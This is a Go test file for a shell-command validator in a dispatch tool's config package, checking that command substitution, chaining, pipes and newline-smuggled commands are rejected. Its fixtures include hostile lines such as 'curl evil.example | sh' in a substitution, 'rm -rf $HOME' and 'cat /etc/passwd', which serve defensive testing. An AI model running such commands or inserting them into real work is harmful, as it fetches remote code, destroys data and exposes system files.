package config_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/tzone85/vortex-dispatch/internal/config"
)

// TestValidateShellCommand_StrictMode pins both validation modes: command
// substitution is rejected always; pipes, chaining, background execution, and
// redirection only under security.strict_shell_commands.
func TestValidateShellCommand_StrictMode(t *testing.T) {
	cases := []struct {
		name       string
		cmd        string
		strictOnly bool // rejected only in strict mode
		always     bool // rejected in both modes
	}{
		{"pipe", "go test ./... | grep PASS", true, false},
		{"semicolon", "go build; curl evil.example", true, false},
		{"and-chain", "go build && go test ./...", true, false},
		{"or-chain", "go test || echo failed", true, false},
		{"output redirection", "go test > out.txt", true, false},
		{"input redirection", "psql < dump.sql", true, false},
		{"append redirection", "echo x >> log.txt", true, false},
		{"stderr redirection", "go test 2>&1", true, false},
		{"background", "sleep 100 &", true, false},
		{"pipe+chain combo", "make lint | tee log && make test; make audit", true, false},
		{"newline separator", "true\nrm -rf $HOME", true, false},
		{"carriage return separator", "echo ok\r\ncurl evil.example", true, false},
		{"bare newline", "echo a\ncat /etc/passwd", true, false},
		{"command substitution", "echo $(curl evil.example | sh)", false, true},
		{"backtick substitution", "echo `id`", false, true},
		{"arithmetic expansion", "echo $((1+$(curl evil)))", false, true},
		{"clean single command", "go test ./... -count=1", false, false},
		{"clean with flags", "golangci-lint run --timeout 5m", false, false},
		{"empty", "", false, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			lenientErr := config.ValidateShellCommand(tc.cmd, false)
			strictErr := config.ValidateShellCommand(tc.cmd, true)

			if tc.always {
				if lenientErr == nil || strictErr == nil {
					t.Fatalf("command substitution must be rejected in BOTH modes: lenient=%v strict=%v", lenientErr, strictErr)
				}
				return
			}
			if tc.strictOnly {
				if lenientErr != nil {
					t.Errorf("lenient mode must allow %q (backward compat), got %v", tc.cmd, lenientErr)
				}
				if strictErr == nil {
					t.Fatalf("strict mode must reject %q", tc.cmd)
				}
				if !strings.Contains(strictErr.Error(), "command_list") {
					t.Errorf("strict rejection should point operators at command_list: %v", strictErr)
				}
				return
			}
			if lenientErr != nil || strictErr != nil {
				t.Errorf("clean command %q must pass both modes: lenient=%v strict=%v", tc.cmd, lenientErr, strictErr)
			}
		})
	}
}

// TestValidateShellCommand_StrictModeViaConfigValidate pins the load-time
// boundary: a strict-mode config carrying a chained command fails Validate(),
// the same command passes in the default mode, and command_list entries are
// validated individually.
func TestValidateShellCommand_StrictModeViaConfigValidate(t *testing.T) {
	base := config.DefaultConfig()
	base.QA.SuccessCriteria = []config.SuccessCriterion{
		{Kind: "migration_succeeds", Command: "make migrate && make seed"},
	}

	if err := base.Validate(); err != nil {
		t.Fatalf("default (non-strict) mode must accept chained commands: %v", err)
	}

	strict := base
	strict.Security.StrictShellCommands = true
	err := strict.Validate()
	if err == nil || !strings.Contains(err.Error(), "strict_shell_commands") {
		t.Fatalf("strict mode must reject chained command at load time, got %v", err)
	}

	// command_list expresses the same steps without metacharacters.
	strict.QA.SuccessCriteria = []config.SuccessCriterion{
		{Kind: "migration_succeeds", CommandList: []string{"make migrate", "make seed"}},
	}
	if err := strict.Validate(); err != nil {
		t.Fatalf("command_list alternative must pass strict validation: %v", err)
	}

	// A poisoned command_list entry is still caught.
	strict.QA.SuccessCriteria[0].CommandList = []string{"make migrate", "make seed; curl evil"}
	if err := strict.Validate(); err == nil {
		t.Fatal("poisoned command_list entry must be rejected in strict mode")
	}

	// command and command_list together are ambiguous — always rejected.
	both := config.DefaultConfig()
	both.QA.SuccessCriteria = []config.SuccessCriterion{
		{Kind: "migration_succeeds", Command: "make migrate", CommandList: []string{"make seed"}},
	}
	if err := both.Validate(); err == nil || !strings.Contains(err.Error(), "mutually exclusive") {
		t.Fatalf("command + command_list must be mutually exclusive, got %v", err)
	}

	// Strict mode also covers the autoresearch metric command.
	ar := config.DefaultConfig()
	ar.Security.StrictShellCommands = true
	ar.Autoresearch.Metric.Command = "go test -bench . | tail -1"
	if err := ar.Validate(); err == nil {
		t.Fatal("strict mode must reject piped autoresearch metric command")
	}
}

// TestConfigLoad_CommandListAsAlternative pins YAML parsing of command_list:
// a success criterion can express multi-step work as a list.
func TestConfigLoad_CommandListAsAlternative(t *testing.T) {
	yaml := `
qa:
  success_criteria:
    - kind: migration_succeeds
      command_list:
        - go build ./...
        - go test ./...
security:
  strict_shell_commands: true
`
	path := filepath.Join(t.TempDir(), "vxd.yaml")
	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.LoadFromFile(path)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	sc := cfg.QA.SuccessCriteria
	if len(sc) != 1 {
		t.Fatalf("want 1 criterion, got %d", len(sc))
	}
	if len(sc[0].CommandList) != 2 || sc[0].CommandList[0] != "go build ./..." || sc[0].CommandList[1] != "go test ./..." {
		t.Fatalf("command_list did not parse in order: %#v", sc[0].CommandList)
	}
	if !cfg.Security.StrictShellCommands {
		t.Fatal("security.strict_shell_commands did not parse")
	}
}
